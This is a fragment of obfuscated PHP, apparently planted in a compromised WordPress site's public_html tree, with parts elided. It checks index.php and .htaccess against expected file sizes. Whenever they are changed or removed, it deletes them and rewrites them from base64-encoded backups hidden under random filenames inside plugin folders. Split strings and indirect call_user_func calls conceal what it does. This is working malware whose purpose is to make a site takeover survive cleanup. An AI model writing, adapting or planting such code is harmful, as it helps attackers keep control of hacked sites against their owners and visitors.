...
$bk_idx_path = '/home/anxorennsqi4/public_html/wp-content/plugins/advanced-custom-fields-pro/ZdSponbs747Cqgr.txt';
$bk_htc_path = '/home/anxorennsqi4/public_html/wp-content/plugins/akismet/J6XSonbs747Z23q.txt';
...
$idx_path = $_SERVER['DOCUME' . 'NT_ROOT'] . '/ind' . 'ex.php';
$htc_path = $_SERVER['DOCUME' . 'NT_ROOT'] . '/.hta' . 'ccess';
$bk_idx_path = '/home/anxorennsqi4/public_html/wp-content/plugins/ppp/inc/dYRPonbs747FRFE.txt';
$bk_htc_path = '/home/anxorennsqi4/public_html/wp-content/plugins/wp-file-manager/inc/dgZwonbs747U27g.txt';

if (call_user_func($f_exists, $bk_idx_path)) {
    if (!call_user_func($f_exists, $idx_path) or call_user_func($f_size, $idx_path) != 6504) {
        if (call_user_func($f_exists, $bk_idx_path)) {
            @call_user_func($ch, $idx_path, 438);
            @call_user_func($delete, $idx_path);
            @call_user_func($f_put_contents, $idx_path, call_user_func($bs_dec, call_user_func($f_get_contents, $bk_idx_path)));
...
if (call_user_func($f_exists, $bk_htc_path)) {
    if (!call_user_func($f_exists, $htc_path) or call_user_func($f_size, $htc_path) != 536) {
        if (call_user_func($f_exists, $bk_htc_path)) {
            @call_user_func($ch, $htc_path, 438);
            @call_user_func($delete, $htc_path);
            @call_user_func($f_put_contents, $htc_path, call_user_func($bs_dec, call_user_func($f_get_contents, $bk_htc_path)));
